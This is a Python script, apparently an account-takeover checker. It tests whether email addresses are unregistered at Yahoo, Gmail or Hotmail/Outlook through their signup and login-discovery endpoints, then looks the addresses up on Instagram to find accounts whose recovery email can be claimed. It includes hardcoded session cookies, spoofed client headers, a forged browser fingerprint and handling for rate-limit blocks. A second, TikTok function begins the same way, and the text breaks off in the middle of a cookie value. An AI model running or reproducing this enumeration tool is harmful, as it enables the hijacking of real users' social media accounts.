BBlack="\033[1;30m"       # Black
BRed="\033[1;31m"         # Red
BGreen="\033[1;32m"       # Green
BYellow="\033[1;33m"      # Yellow
BBlue="\033[1;34m"        # Blue
BPurple="\033[1;35m"      # Purple
BCyan="\033[1;36m"        # Cyan
BWhite="\033[1;37m"       # White
Black="\033[1;30m"       # Black
Red="\033[1;31m"         # 
Green="\033[1;32m"       # 'هGreen
Yellow="\033[1;33m"      # Yellow
Blue="\033[1;34m"        # Blue
Purple="\033[1;35m"      # Purple
Cyan="\033[1;36m"        # Cyan
White="\033[1;37m"       # White
import os
try:
	import random
	import requests
	from time import sleep
	import json
	from user_agent import generate_user_agent
except :
	os.system('pip3 install random')
	os.system('pip3 install user_agent')
	os.system('pip3 install requests')
	os.system('pip3 install json')
	os.system('pip3 install time')
	os.system('pip install random')
	os.system('pip install user_agent')
	os.system('pip install requests')
	os.system('pip install json')
	os.system('pip install time')
bad,done,block=0,0,0
r=requests.session()
def INSTAGRAM(email,domen):
      global bad,done,block
      
      
      if domen == '@yahoo.com':
      	
      	headers = {
			'authority': 'login.yahoo.com',
		  'accept': '*/*',
		  'accept-language': 'en-US,en;q=0.9',
		  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'origin': 'https://login.yahoo.com',
      'referer': 'https://login.yahoo.com/account/module/create?intl=xa&specId=yidregsimplified&context=reg&done=https%3A%2F%2Fwww.yahoo.com',
      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
      'x-requested-with': 'XMLHttpRequest',
}
      	cook = {
			'A3': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc',
		  'A1': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc',
		  'A1S': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc&j=WORLD',
		  'AS': 'v=1&s=0sHA17fo&d=A62cb7327|5xRp8pr.2UJmOAqR8uAJglbFObbsH8uOznbuKM00ySlD8Ha.X4jNUXo4VEjGrKs97pN8kPAqzIf1jQcTQp5veb991hp7CXQa18n8eMvtp0i3TKdzY_snYqc41YJj1lVf5YXbOhZFbUgbZ2.BI5VJuQoxc9BfU6gFuHcokkx86DndLRGqMpFyzmFeAViTx6LSbPs2soSDVxJyEtCeBln32VP6QDigRPlUzpL8mrluwSF4NXjjJg3kpS308GYePy96Pznh3CvVja7A0RUIQanRzwQWoKX7u3c5Kgak5jZEasYEQHnqWNCzZXZn5j7BKRKruJ3nhcjBB0BD7YCmViG7NYR1QnbCOntbcWVTvhgr3v7fYIg5cx93ChX3TrMiqfnj.h35U2rNdLWlilATg3BEysTnYSjSIsKcQYnA4C9vzP8Db7tHidwbS1cCjttg.aOyemeymvsE2Y_FsfkK4Qeqx6b0cwqrM7IqzCp0vQp5I_87QmIk8boy4dYeyswIGcdnkLJb45mKMh3DsI5vMN7xyTRhJYO7JVMisaK0Zw8EyrG8z8hCgnozUBv3LpyJjxqbGQGcNBkvn7lhWZgLvsNoBUgVaTEYw5UC0aG7QCh2U7KF9qvv9O0CMZor7aubtx3Z.7SKZVAo7f1yPc4huhhlghkzbNn4BQBL0Fx0dEjQ3Df54gjiOVp5AcJlGM9qlkjbIMDQlg2n_LDedAwQgRoyvPxyrP.Tvqua0OFVi_LUaamtbNsS1SgmJTKobw2K3R39VKy9gcA0vieC9MvgkXQI._E_vz1BtEav0E6RsD2cD.k9j0Jw2brizvfy1wfr6vWoC1bqTMwiEzNGjsX0ug9Yf.yzteWwiWeIAbBG5aSyw9r4O_D9AIig62YIj6y5ERN1msWLRSFv3Dj.ExQ2ek7xuSeN7qW5EIh.4Pnvbm1WNv1TXVuw23WA7HV7WtEiOkfFDs5DvjhLX4MIU_Bt.gpZAcg89Yg-~A|B62cb779f|5f1yTBf.2Tq2W7LQ3KsSFbticESMze16y.0N0bOBd_EFQ_q1.moN9y.T_Vf0mwzJRub.9SzesA7Pzge4dwE_n84Jwg31ipQlUd7uIpky29J0EB2spihP_9ukbwI3MhWdMnds18q42N5ajt9kgn10vdAx5Fp9sNFAbXVl0op1I9bNGrfuz_4_P.a8Eoak702B2ebotX0YdNYct.IJ66Qfd8D.3g1ymlmnHxr7Y2IwJYCg15oQyQBeF8Z7DNW8_kZrP1s6dSZpd75ZI6wro_Rwh2ubvUely.oxpRFUTM2Vlh_VxnvDBDkBPaUC6OO0POVyPIbbCYKUWCVKcMQ_iVYhT.Nh0hntrcppxtz4BVp0rB6jAeb8nc0CrwSFRXP4uo8ICcsK22LsRqH7GWqqpQgrgZC51xJoFGph.Z4ZIX8fMu80u4Eh7lVx4emSGoO3UfrvvkL1RFWxHBfnSxeTmc3dYdPIpJj18qWQShVerqs1UcsB7Hxh67QTx1d2VqqKH9y044pHa55bjeSRnOkIYdHYv2us5rQSEw_04BBRBPAgbSnWrl9COJvpVTVeMF6ykV1.TJzQCKltU4uRTKiQIKfy9vGJuiKjwjFc7h1V5S9Y8Jd69EaDEb1XCaeOAruPYJqc9MINCeycUQFqhxUoHKUORcK9RV_9EINbPwgiB290jhdk3mEffmVI8a8RCcIpiW5dwUCgMkrBb90ebetwP_I9I5fke_USUYS3KtIsOq7L8APsJ4lCmwOdfAPm9OWyLz20bOdk0CidwpDFrqqxQt2JfUe_oyJB8FdZRfmcGmvjrnZm6blzGzUbFnxxJ.5ydhPjmf345BXcxnS3E.U0emkN4Wc0V.xzM_hkQh.oCeqWzSqf15eHZRSoLUusEUA.31Md9l67W_lNcQ.6nASTIWxr_q0l8jjGSGyiyJY-~A',
}
      	
      	
      	data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A4%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A420%2C%22timezone%22%3A%22America%2FLos_Angeles%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%203000%20Direct3D9Ex%20vs_3_0%20ps_3_0%2C%20igdumd64.dll)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1657415199200%2C%22render%22%3A1657415200314%7D%7D&specId=yidregsimplified&cacheStored=&crumb=V0Pr4B6tQHi&acrumb=0sHA17fo&done=https%3A%2F%2Fwww.yahoo.com&googleIdToken=&authCode=&attrSetIndex=0&specData=3qiYX%2FHBcI%2F%2BhrvMxYBXgXQb1%2FYAeMSHZmV4MqgmhqN1URqj%2FsjgTGrzl4FYAaAL1UczLgsaT4rm7Cq3BXusOpCF83nfWay%2BC4rhWCth8rBob6OT8S9v0s7KQfuZoeXmPP0NCJxRHjiKlQBmUepkdKTRtym7LERXeBITKc8qTL15f6Vb9O1yc3ZBETBW%2FOpt6%2FNdXvTgPh8z9rX4CcDlWyjVuO2KusJUgIe2sQ%2BSs7EOIYSCVcNUAOqCtXAFkLyS%2FwtNW9ew2r%2BdkiOEmXXi2Akg3YFs3tNskYHR8cTvqHvpf9mEeGwYDCg0%2FGzQybLfG9um3opaS%2Bvnkz19nTE2jfxnlgudhbhKSkg5b4I3WA7tiQh%2BfdpkINdYrPRYXa%2FbQO47iWX9XnSJm536xRWWqrirGNYme3ZP%2FkbEHdsOCRN59fCXf9GEj0GSdIOYs2OI%2FgcOEl%2BQAV3uH0Dg8OZC0Cm9Nrk%2FYJTIntesxVHvpI5qGAYMr8sR47yrUHuZCahwj9T8tJob%2BJh7cKO1rw83V07K4zwiBSzeQyxbKKj%2BoaUK6tDYVCsS0nsPl9YYzNakW4V6hLVHiMlIwrqdSaaqyD%2FpkWwIZon33c6ulzzRogLES4lZi%2B6Y1I34QbnRs1M1%2Blag9xNYAhe2ysOQWsbec5F2vJaYY941UzlAEH5Z2aoCAgUchjmfRvAqwD3J%2FKlAmwATVMjlgwYwiGZb%2Bc6XIyzGV0P4iq%2F0h8mvJaBqloH%2Be8G%2BOApb2ybaGWor1R1RCt5oHPvbi5pcXhv895j3Pf8R%2BzuCxZu%2F2fLWCugzT4auXfUEvQoR9cBsQxKBe%2Fiw6eo78VzExH9qBh2kpEqtjy1LkHzoh24mn%2FTykqvPMu6cOtu0ZNv%2BCQVEXhER%2BLiZmHqtkvc75fUK1ELu4lKpMitRu4%2BnYTf7saiWOVdn2gQgI2p%2FXU7iPBSxwEzabRpoVwb5wUymGZFsloAcLmBz0FuWtkoqfHzmJdQSZY1y%2BJqMKP30vK8Zy9%2F8RVMpvb859VdesnhF%2B%2B1lFWkfCal3tQNR%2FnN%2BScD4A9rDs1alXxvEpGjnXSpCQ569imLxX11pbaozUXipv4%2BG2WrhGGuTulBoeucBhkiTNf3r73WJfwRCCJCEyztLcYbl3x9P6ahKOjGKEdVDnVi4vGIi47A56jVoQn3QoHmahw6PsqlV4dhtd0u%2BYQ0s09rmFGABQjPdQaSddrB0g32WVOBdruFLeevg9bKRkZYOcr1AfWsuIqi6HaDiKCgomeNN0xB77B0lrwLyS6bW5iGTPP6a%2BlokF6YJKoIlh%2B3xVDWZ4%2Bjj3iEViHGJJA4hsLGy%2FN88eRNZ2RVo957EK3%2FE6vu0L4phnMCwMRxx7PVY2d3oHdGfyMpYFnHK1HRhWspF6PbLoz1jewpUPtuUXmA8qtphATgd4GpwugPQJq6L6n1RFRnHd8WrazHf1HxSO1cZObRYDFPwwR1TK4RkS%2FCoHMePTwNFgy85Z%2FDZ3QYKGhQ8himvoLFH9yLpERLhvS7n%2BV%2BXBJhEOUEDqrTgzf87BX2qI5pKB8P1SZelaAgUU3cXMqxo3et1yxlXaeOptj3K6QrZHs%2BjfTWp5rSVCQ7lj%2BFVql1JChhIU7t0E6h0Y73%2Fy%2BSfnUUtLrjySQQD1vHE%2F6eZYQUHUnz7bYj88EVQZ4e8LAYJvh62gYgoHNIHnk%2Bsa18Q3OUVhcCRqaO4XIiUCWXWaMa8TC7OWOicicC7C73mfEapdQoRpacErL5cDj0lVU%2FkSO31BukbIJ3qXArWnB6xHoBG2L%2FJnwURub4U0e65qB3cAnFe1z%2Bu9SIYRQtmEX%2B%2Fb91mI%2F06XMQd3YrYv%2Bod2sTCVHbpiUXe6vR%2FG5edhHiGB53aMuHX1ljEB711okyoJOViTHu1Fuf4pLhvDSZyOeHBqqX5qj%2FsNjoyZGI1o04O%2F2u%2Bo%2BJMy5YvVVRd8ALRgcpOkqdG9KuT00t1b7R5J5TKKxwUbqMKnkUHGbHi3hA9rHD6Kqn7nfFNvzLmFvA7aN4mFbGy8SncJ9O6MBofHhFnPkhC%2FZdxkYtjDAtSRE9AVNvxEbbGHhqhKBJFaDn%2F2zbK1OqAyC1Wy7rjD7bzYZT3RFKprvz4Dp1SZO732C6%2BcEStFzKt1hK%2FzXDidbZz6bgRhasGBzT2m5ty1F8Y9VCUeIcDbhzkcsztEsqjTbgF1VHJvuxAPo14nDI%2FCHcGCOX7aHSXH4U7G0YFH7O09NruPxcR40KCfO%2FF8eQ%2Bd4ovBGb1SW%2F4wcJ9pWzPKS4XUQ5xSlitdekid5nyDTSEIODfW2vLufF9Da%2BFuj87kH0TtBcM0SR7d5XfYAMA1OOmzOt35LCJGFgF%2F3xyLZv1ghZT%2Bx28qC8fZ7V%2FVnH3uYrVM1S%2FIN71UZRS%2FUK6Cq9bVLrRfGSRqAYlpSalBB8squ%2BsGQ%2FrhLtu6J29Ttg0N1wHovjPX9kPgqsVCcYTIrUE0PcZDw%2BGd5EUiyBNF6HZ4oAMafvj5snS9gLIhIcG82aEhwIfiBR9Rwm%2F%2F7hGq5REIesblFcPIszNvXHr8Prb4xetLLmTYlLxHa9FhoiUG3HxbTJFxSPdc03x9h0665awOppQ4YxAQHjcxOrrzjxhrcZH2TL7DAJZS7F%2FpQae11m00SYVMbufIUT5rCqGf1Kc1zLEbVbEksEgsJ3I3xsjexEUPD9tuDOA5KzqfKBGG3jNbuSrfVcVgk6s9bsGRifmYPbk5ahcXu3c7ekuPG72VDVSaS9kpIFMyVDzQV%2F%2BFdK1vIC48pyZXyVNStS6KxQbKj8CkexdqxJwlV1JpRL8sFYb6o0L%2FMJNL%2B2GMVToSJXCqiM0BaBfvBIae2dIhs2tvZlui7IIUdUAQkwAMjjL9LN%2BvIgdoVtCupTMD3TUqTDfU1Cg0C3K98xi5mfeGP6JJwoSlztXIGDuM4EL%2FnSthWs9gniCkxA36e%2F6zW%2FioH0BKVMFanLjjBRUbaKSdVxtQiJYZ6wiYGJhm%2BTGCPMQG2JLlDj4bJeiNCe8wFzDEDUSL8Q65FLSCcZc9UQBxzSSpeIzCSFT4sY%2Fy61Nr%2BgPgBC36PGOx7M0rPPeeU1ePluevsUiXMhcAl7eayJnr5tG1iqRa%2FFSf5jhEaWM7eC10Ey7iAiNDvtxzoSFRqjnEAADD%2FPzhUmcBJdowhE4Y4YBRB81pIgWFgbuhD31Cnfl93n1UBSPEdvR%2B9acYSeFhLoJFkYIjDzwxi9sjp8ik9wUwk70ff9aJRrkfQRWDliWDaJA2um0X%2FYxazTvk6UYJ9du01kePKT%2BUs8fpulOJhEUi2U02ZyqVwpgeoQmdGrztvt9v7U5vICRNpXm3sdcx8bfkvFMRGsUoxPM%2Fxnla9yal2ZtkWPOltctM%2FmdkJtlBvHjffRBOV9CRHP0b7fIZAGFFh2qQbvkRrf53cQQG3OIM5d5AdtiC7769vQ1uKtciUcAmngVpQfMqXBdSgSA5xG1nKfxyZO9oTGIGlf5xJ9lCdoQdLuyJlR6ma5ro29HzqO%2FelrWrajXYFRMqb0jfbMTZiV0hyZpb8Whu6r5KEQ4i2iyZXrMu%2FKXN1LntbdD8%2BHRBQITCt3hvqkk0D%2BU8e1LGceaHsUyVOKx3KN%2FeH3iUAYX4LhP7QKylegSCMX8ujZMyQarDnJmUhdtdVTpqZuskfC3U%2BFuqcV1ueLwy7i7nwlnJR916wpBEKzJxuu5W4XY1xl295AAkrqQ1w3dQD3Y1RmzbHptQooybc87d4P%2BP48djTkXjk5%2BtzQza31zuVMYeXCEOveFDLjhCWJ%2FEfVo4om0PcaQMJ8rIJcwRPbBCHJHPny%2Bp5IjImeGDscr7NZfj6Rxs9a7BzbRv6sSZitlQrzasw8T5XHIglPVLX9qT1uvUhey%2FETHBTZS%2Fy4CyfIwCBgi7TV4L%2FY0D49DyWNvf9TUP4f%2FxP7fPw0MbUkf16e8fzUE2tkvkeeoYzyXkU5Oe9JSS6c2Jfwo%2FFRTB5K75JNwdog8sebO1NyXRVjJlaoS4SgnVJk5Aix2NUPMcIJU5MmYji0gKu1A6QSODbRtXhmvyd8b1FwRv1MWCSmUHfbkZYxLE6GDO24gaYyrwp0h7ahYC55bti4QrVpPDCcGEj7cUBtzUcLMT2MJOXsfjsAbRsRxBW%2BeMOpMhdnEDTFkNIbUPsmzzrMaUu7Y%2BUAfap639tZUe%2FbNqgibgye2KhlXPS%2FTGtxUGsDZqVBCW03N%2FWahUWhtLKp7KJnutk9otzkZ07VHReV1x3fblTYgS59RSPXwUGY97wQCpSbCFpL7xISbzM0SoAegHDQYy09MtD1vfhfDeEZHyR%2FFCt0YLWvIRVoA8A2K5xWUMmPrd657A2gGKeT0%2FthL%2FZpHTSOLLd5RA9VTKXNVu3xE%2FF0OKQ1HTp4p35M4FJV6eheJOiPgcU1BMuZKMXCXf7x0bpCevEXIeSYaD8pQJHLPXyCj%2BpWzjzNdBhOjbtSdloonEyHvrm19UB10QxDR%2B2fMLKJIDKQJtgYFjQhXGUxGpEmPTQ0uekJZ48ej2Gji1tqWlseMOMipg0S1Rgta7MWQQ3EL88J7u9PJf9soLTOaf7Pqqs%2BobulcEsjxv9aPwILr15ZMfdspWg%2Btx8%2BN5b%2B0uYMSwh%2FOdeMCHS8DONFUKN%2BI8ln3tV0kFaqPNNdHTbwJzbPv1a0Y7v%2FCaqPOoAqXPwpUxmI%2FzgQtCgJ91Raj%2F%2BPNzxDn6JxE7nUIo1X%2BjUwerAkQ2Dygy8Fho%2Bw1BYfihj03CZhjS1krj8Vd04aQabeKSZVzdjfCdpkfzwFHfi77iq6vKPHsQmsZadPFf6aXVazYE6SrXj4RRbaoBsW%2BtJ9PGpu3En9CgvKk9JrArFBq4qRM56H2C%2FwIoUQxYEFQgxiB9RYZMF1ZHmTluTqYOak6GO%2Fw7D%2FZjhBWtnBlpTbMafcrExzCy0YuUklTs5v3gQ6uMdvpWo60FlSd4TBhgRu%2BoyOMzxC2U7swA8JqWlfnvrlX0NmrSYKNHzloPAfpXINg7IR4%2BP2vdHHyEu%2FdymeKI4b3cS8fEDC%2BIr4D%2BfXa1edNyqPdFIFmvKGZeVRDuIXNXM%2BjZLLAD7R8Pw%2FRXC5X%2FgGXX01HU4Ma7vPcIcoUY0HpYRohxZHbuvlCxlbj6MMteOXJJPtgiN7z%2BjC6eyognmaE%2BWWeg4uemCw8mw0Ld2mKorywvWbu4DvOBaXuivqtDfkH5b%2BQstz493hTZ5ovVuAssLygF6US%2FFabYr3KxoyEjmhYpvsA45wctYfcjmFwdf1QT2wQz%2FOoskWn1fCsGKCU6OCb%2BHBCQa5KCSN5y%2FNpOWXUIyB3Z5jQXrs3%2F%2BcWGRkm6fDXJHiASkDuhaJuhg%2BHXaFPTGouoi%2BDpseLIE6QDjIhgVsm2WKIlTJfAekOEQMW8IPzFjABJrdWgZg08BqHIwFTSoMgz6DCT3xP%2BpCZE9xkzXCsPKgtvjqAyVrc8rQWvC2XznQYahjmw%2FTPz10lDVAlH41I8XP132BqPUv5jy3tmjQTFeIkbfH%2BQoe2HN4rHa07AwLHP6Y0gDQqIkbY4lPUoHNPeS6jVXnb6d%2FGFRl8tTKg4QCEaZX3lwzjjXXVAlmz%2BZ0wc1jGXRclTPTNnR%2BvklAjqPIypAz%2BR9tx4rLe5jHLXuCy0LHuIdb5OLrCF%2Fgr1MCywGJHpNao4oeukqk6OPPtFN8eYplJy8tnNwoJSsoNrXR1iNFIt%2F3VZRtgOQvrGQ7x0AXwvVqX6Vt%2BYzQ3WWQdu%2BBI9CsFPE7IX4Ek1ZJ97r1%2BREvommgXkRii4pYbZPEGbkgVMcI42x94LtVEM2ZXqsJyAaQY9rX7bsSAahgp3udxAGzoa%2FjTs6tW1oD6sBin1kcjElZbkBI80DCV2rka9LDImH9ZM7NDDU6leamdb2oJCAmB1YMXozgIV5kpMgbVr1%2BdAPuJX3lKyk9kWI9VrBCtmMo%3D%7CjUP9j77GikcMDQ84gY3nfg%3D%3D%7CIM7sEaFvNp%2BZ6Fsp6b915A%3D%3D&tos0=oath_freereg%7Cxa%7Cen-JO&firstName=&lastName=&userid-domain=yahoo&userId={email}&password=&birthYear=&signup='
      	p = {'validateField': 'userId',}
      	response = requests.post('https://login.yahoo.com/account/module/create', params=p,cookies=cook,headers=headers, data=data).text
      	if 'userId' in response:
      		return 'bad'
      	
      	
      	else:
      		url = "https://i.instagram.com:443/api/v1/users/lookup/"
      		cookies = {"mid": "XOSINgABAAG1IDmaral3noOozrK0rrNSbPuSbzHq"}
      		headers = {"Connection": "close", "X-IG-Connection-Type": "WIFI", "X-IG-Capabilities": "3R4=",
             "Accept-Language": "ar-AE",
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "User-Agent": "Instagram 99.4.0 S3od_al3nzi (Dmaral3noOoz)",
             "Accept-Encoding": "gzip, deflate"}
      		data = {"signed_body": "35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{\"q\":\"%s\"}" % email }
      		re = r.post(url, headers=headers,cookies=cookies, data=data)
      		if re.json()['status']=='ok':
      			return 'done'
      		
      		elif 'spam' in re.text:
      			return 'block'
      		elif  re.json()['status']=='fail': 
      			return 'email_good'
      
      
      
      
      
      
      
      
     
      
      
      
      if domen == '@gmail.com':
          url = 'https://android.clients.google.com/setup/checkavail'
          headers = {
				'Content-Length': '98',
        'Content-Type': 'text/plain; charset=UTF-8',
        'Host': 'android.clients.google.com',
        'Connection': 'Keep-Alive',
        'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)',
   }
          data = json.dumps({
	          'username': email,
	          'version': '3',
	          'firstName': '3mk',
	          'lastName': 'Coder' })
          res = requests.post(url, data=data, headers=headers).json()['status']
          if res == 'SUCCESS':
           url = "https://i.instagram.com:443/api/v1/users/lookup/"
           cookies = {"mid": "XOSINgABAAG1IDmaral3noOozrK0rrNSbPuSbzHq"}
           headers = {"Connection": "close", "X-IG-Connection-Type": "WIFI", "X-IG-Capabilities": "3R4=",
             "Accept-Language": "ar-AE",
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "User-Agent": "Instagram 99.4.0 S3od_al3nzi (Dmaral3noOoz)",
             "Accept-Encoding": "gzip, deflate"}
           data = {"signed_body": "35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{\"q\":\"%s\"}" % email }
      
           re = r.post(url, headers=headers,cookies=cookies, data=data)
           if re.json()['status']=='ok':
           	return 'done'
           elif 'spam' in re.text:
           	return 'block'
           elif  re.json()['status']=='fail': 
           	return 'email_good'
          else:
            return 'bad'
        
        
        
        
        
        
       
      
      
      
      
      
      
      
      elif domen == '@hotmail.com' or domen == '@outlook.com':
      	url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
      	data = ''
      	headers = {
	"Accept": "*/*",
	"Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
    "Connection": "close",
    "Host": "odc.officeapps.live.com",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
    "uaid": "d06e1498e7ed4def9078bd46883f187b",
    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
      	html = requests.get(url, data=data, headers=headers).text
      	if 'Neither' in html:
           url = "https://i.instagram.com:443/api/v1/users/lookup/"
           cookies = {"mid": "XOSINgABAAG1IDmaral3noOozrK0rrNSbPuSbzHq"}
           headers = {"Connection": "close", "X-IG-Connection-Type": "WIFI", "X-IG-Capabilities": "3R4=",
             "Accept-Language": "ar-AE",
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "User-Agent": "Instagram 99.4.0 S3od_al3nzi (Dmaral3noOoz)",
             "Accept-Encoding": "gzip, deflate"}
           data = {"signed_body": "35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{\"q\":\"%s\"}" % email }
      
           re = r.post(url, headers=headers,cookies=cookies, data=data)
           if re.json()['status']=='ok':
           	return 'done'
           elif 'spam' in re.text:
           	return 'block'
           elif  re.json()['status']=='fail': 
           	return 'email_good'
      	else:
            return 'bad'
      	
      	
      	
      	
      
       
        
        
        
        
        
        
        
        
        
        
        
        
        
        
         
        
        
        
      
      
      
      
      
   
      
       




def tiktok(email,domen):
      global bad,done,block
      
      
      if domen == '@yahoo.com':
      	headers = {
			'authority': 'login.yahoo.com',
		  'accept': '*/*',
		  'accept-language': 'en-US,en;q=0.9',
		  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'origin': 'https://login.yahoo.com',
      'referer': 'https://login.yahoo.com/account/module/create?intl=xa&specId=yidregsimplified&context=reg&done=https%3A%2F%2Fwww.yahoo.com',
      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
      'x-requested-with': 'XMLHttpRequest',
}
      	cook = {
			'A3': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc',
		  'A1': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc',
		  'A1S': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc&j=WORLD',
		  'AS': 'v=1&s=0sHA17fo&d=A62cb7327|5xRp8pr.2UJmOAqR8uAJglbFObbsH8uOznbuKM00ySlD8Ha.X4jNUXo4VEjGrKs97pN8kPAqzIf1jQcTQp5veb991hp7CXQa18n8eMvtp0i3TKdzY_snYqc41YJj1lVf5YXbOhZFbUgbZ2.BI5VJuQoxc9BfU6gFuHcokkx86DndLRGqMpFyzmFeAViTx6LSbPs2soSDVxJyEtCeBln32VP6QDigRPlUzpL8mrluwSF4NXjjJg3kpS308GYePy96Pznh3CvVja7A0RUIQanRzwQWoKX7u3c5Kgak5jZEasYEQHnqWNCzZXZn5j7BKRKruJ3nhcjBB0BD7YCmViG7NYR1QnbCOntbcWVTvhgr3v7fYIg5cx93ChX3TrMiqfnj.h35U2rNdLWlilATg3BEysTnYSjSIsKcQYnA4C9vzP8Db7tHidwbS1cCjttg.aOyemeymvsE2Y_FsfkK4Qeqx6b0cwqrM7IqzCp0vQp5I_87QmIk8boy4dYeyswIGcdnkLJb45mKMh3DsI5vMN7xyTRhJYO7JVMisaK0Zw8EyrG8z8hCgnozUBv3LpyJjxqbGQGcNBkvn7lhWZgLvsNoBUgVaTEYw5UC0aG7QCh2U7KF9qvv9O0CMZor7aubtx3Z.7SKZVAo7f1yPc4huhhlghkzbNn4BQBL0Fx0dEjQ3Df54gjiOVp5AcJlGM9qlkjbIMDQlg2n_LDedAwQgRoyvPxyrP.Tvqua0OFVi_LUaamtbNsS1SgmJTKobw2K3R39VKy9gcA0vieC9MvgkXQI._E_vz1BtEav0E6RsD2cD.k9j0Jw2brizvfy1wfr6vWoC1bqTMwiEzNGjsX0ug9Yf.yzteWwiWeIAbBG5aSyw9r4O_D9AIig62YIj6y5ERN1msWLRSFv3Dj.ExQ2ek7xuSeN7qW5EIh.4Pnvbm1WNv1TXVuw23WA7HV7WtEiOkfFDs5DvjhLX4MIU_Bt.gpZAcg89Yg-~A|B62cb779f|5f1yTBf.2Tq2W7LQ3KsSFbticESMze16y.0N0bOBd_EFQ_q1.moN9y.T_Vf0mwzJRub.9SzesA7Pzge4dwE_n84Jwg31ipQlUd7uIpky29J0EB2spihP_9ukbwI3MhWdMnds18q42N5ajt9kgn10vdAx5Fp9sNFAbXVl0op1I9bNGrfuz_4_P.a8Eoak702B2ebotX0YdNYct.IJ66Qfd8D.3g1ymlmnHxr7Y2IwJYCg15oQyQBeF8Z7DNW8_kZrP1s6dSZpd75ZI6wro_Rwh2ubvUely.oxpRFUTM2Vlh_VxnvDBDkBPaUC6OO0POVyPIbbCYKUWCVKcMQ_iVYhT.Nh0hntrcppxtz4BVp0rB6jAeb8nc0CrwSFRXP4uo8ICcsK22LsRqH7GWqqpQgrgZC51xJoFGph.Z4ZIX8fMu80u4Eh7lVx4emSGoO3UfrvvkL1RFWxHBfnSxeTmc3